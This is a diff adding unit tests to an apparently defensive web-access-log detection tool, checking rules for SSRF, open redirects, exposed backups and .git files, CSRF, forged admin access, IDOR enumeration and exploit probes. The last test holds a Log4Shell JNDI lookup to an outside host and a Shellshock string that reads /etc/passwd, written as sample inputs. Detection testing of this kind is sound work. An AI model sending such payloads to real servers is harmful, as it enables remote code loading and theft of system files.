@@ -227,5 +227,56 @@ class NewRuleTests(unittest.TestCase):
         self.assertIn("WEBLOG_UPLOAD_EXEC", rules)
 
 
+class ExternalChainTests(unittest.TestCase):
+    def _rules(self, line, profile=None):
+        return {f.rule for f in webdetect.run_web_detections(weblog.parse_access(line), profile or SiteProfile())}
+
+    def test_ssrf_internal_address(self):
+        line = acc(q="").replace("/search.php?q=", "/fetch.php?url=http://127.0.0.1:8081/internal/stats.php")
+        self.assertIn("WEBLOG_SSRF", self._rules(line))
+
+    def test_ssrf_public_address_not_flagged(self):
+        line = acc(q="").replace("/search.php?q=", "/fetch.php?url=https://example.com/a.jpg")
+        self.assertNotIn("WEBLOG_SSRF", self._rules(line))
+
+    def test_open_redirect_query(self):
+        line = acc(q="").replace("/search.php?q=", "/login.php?next=http://evil.example/verify")
+        self.assertIn("WEBLOG_OPEN_REDIRECT", self._rules(line))
+
+    def test_backup_and_git_exposure_need_success(self):
+        ok = acc(q="").replace("/search.php?q=", "/backup.sql")
+        miss = acc(q="").replace("/search.php?q=", "/backup.sql").replace(" 200 ", " 404 ")
+        git = acc(q="").replace("/search.php?q=", "/.git/config")
+        self.assertIn("WEBLOG_BACKUP_LEAK", self._rules(ok))
+        self.assertNotIn("WEBLOG_BACKUP_LEAK", self._rules(miss))
+        self.assertIn("WEBLOG_BACKUP_LEAK", self._rules(git))
+
+    def test_directory_listing_of_uploads(self):
+        line = acc(q="").replace("/search.php?q=", "/uploads/")
+        p = SiteProfile(upload_dirs=["/uploads"])
+        self.assertIn("WEBLOG_DIR_LISTING", self._rules(line, p))
+
+    def test_csrf_foreign_referer_on_admin_post(self):
+        base = ('198.51.100.9 - - [10/Oct/2026:13:55:36 +0000] "POST /admin/delete_product.php HTTP/1.1" '
+                '302 0 "{ref}" "Mozilla/5.0"')
+        self.assertIn("WEBLOG_CSRF_SUSPECT", self._rules(base.format(ref="http://evil.example/p.html")))
+        self.assertNotIn("WEBLOG_CSRF_SUSPECT", self._rules(base.format(ref="http://127.0.0.1:8081/admin/members.php")))
+
+    def test_forged_admin_cookie_without_login(self):
+        line = ('198.51.100.9 - - [10/Oct/2026:13:55:40 +0000] "GET /admin/members.php HTTP/1.1" 200 120000 "-" "x"')
+        self.assertIn("WEBLOG_ADMIN_FORGED", self._rules(line, SiteProfile()))
+
+    def test_idor_sequential_orders(self):
+        lines = "\n".join(
+            f'198.51.100.9 - - [10/Oct/2026:13:55:{i:02d} +0000] "GET /order.php?id={i} HTTP/1.1" 200 300 "-" "x"'
+            for i in range(1, 13))
+        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), SiteProfile())}
+        self.assertIn("WEBLOG_IDOR_ENUM", rules)
+
+    def test_probe_strings_in_user_agent(self):
+        self.assertIn("WEBLOG_EXPLOIT_PROBE", self._rules(acc(ua="${jndi:ldap://198.51.100.99/a}")))
+        self.assertIn("WEBLOG_EXPLOIT_PROBE", self._rules(acc(ua="() { :; }; /bin/cat /etc/passwd")))
+
+
 if __name__ == "__main__":
     unittest.main()
